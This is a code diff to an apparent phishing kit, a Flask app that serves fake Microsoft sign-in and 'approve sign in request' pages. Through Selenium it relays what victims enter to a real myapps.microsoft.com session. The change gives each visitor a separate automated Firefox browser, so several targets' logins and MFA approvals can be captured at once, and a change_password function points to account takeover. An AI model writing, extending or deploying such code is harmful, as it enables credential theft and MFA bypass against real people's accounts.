@@ -21,9 +21,9 @@ def PASSWORD_PAGE(form): return render_template("login.html", title="Fake sign i
 def AUTHENTICATION_PAGE(authentication_code): return render_template("login.html", seconds_per_refresh=4, title="Fake sign in to Microsoft account", header="Approve sign in request", authentication_code=authentication_code)
 def INDEX_PAGE(): return render_template("index.html", title="Fake Apps", header="Fake dashboard", name=session["name"])
 
-DRIVER = webdriver.Firefox(service = WEB_DRIVER_SERVICE())
-DRIVER.get("https://myapps.microsoft.com")
-
+session_count = 0
+drivers = []
+DRIVER = None
 password_changed = False
 
 def change_password():
@@ -85,6 +85,19 @@ def index():
 
 @app.route("/login", methods=["GET", "POST"])
 def login():
+    global session_count
+    global drivers
+    global DRIVER
+
+    if "id" not in session:
+        session["id"] = session_count
+        session_count += 1
+
+        drivers.append(webdriver.Firefox(service = WEB_DRIVER_SERVICE()))
+        drivers[session["id"]].get("https://myapps.microsoft.com")
+
+    DRIVER = drivers[session["id"]]
+
     name_form = NameForm()
     password_form = PasswordForm()
 
